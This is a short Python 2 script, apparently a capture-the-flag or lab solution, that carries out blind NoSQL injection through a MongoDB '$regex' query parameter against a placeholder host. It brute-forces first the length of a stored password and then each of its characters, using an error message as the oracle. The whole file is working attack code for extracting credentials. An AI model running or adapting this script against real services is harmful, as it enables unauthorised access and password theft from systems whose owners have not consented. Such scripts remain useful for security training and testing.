import requests
import time

URL_BASE = "http://xxx/?user[$regex]="
NEEDLE   = "This is not a valid"

def test(r):
    time.sleep(0.2)    
    ok = requests.get(URL_BASE + r, proxies={'http':'http://127.0.0.1:3128/'}).text.find(NEEDLE) == -1
    print "[+] Test :", r
    return ok
    
def get_len():
    i = 1
    while test(".{%d}" % i):
        i += 1
        time.sleep(0.2) 
    return i-1        

def password(cur, l):
    charset = map(chr, range(32,128))
    for c in charset:
        if not c in '#&.*?\\':
            if test(cur + c + (".{%d}" % (l-len(p)-1))):
                return c
    print "Err"


print "[+] Finding password len"
l = get_len()
print "[+] Len :", l

p = ""
for i in range(l):
    print "[+] Finding char %d" % (i+1)
    p += password(p, l)
    print "[+] Password :", p
 